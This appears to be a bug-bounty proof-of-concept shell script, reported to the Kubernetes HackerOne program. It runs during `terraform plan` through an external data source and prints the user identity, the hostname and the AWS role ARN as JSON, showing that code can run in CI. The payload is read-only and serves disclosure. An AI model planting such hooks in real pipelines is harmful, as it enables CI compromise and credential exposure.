#!/bin/sh
# Security research PoC (read-only). Reported via the Kubernetes HackerOne program.
# Executed by `terraform plan` through the external data source in poc_ci_check.tf.
USER_LINE="$(id 2>&1 | tr -d '\n')"
HOST_LINE="$(hostname 2>&1 | tr -d '\n')"
printf '{"check": "ci-code-execution-poc", "user": "%s", "host": "%s", "aws_role_env": "%s"}' "$USER_LINE" "$HOST_LINE" "${AWS_ROLE_ARN:-unset}"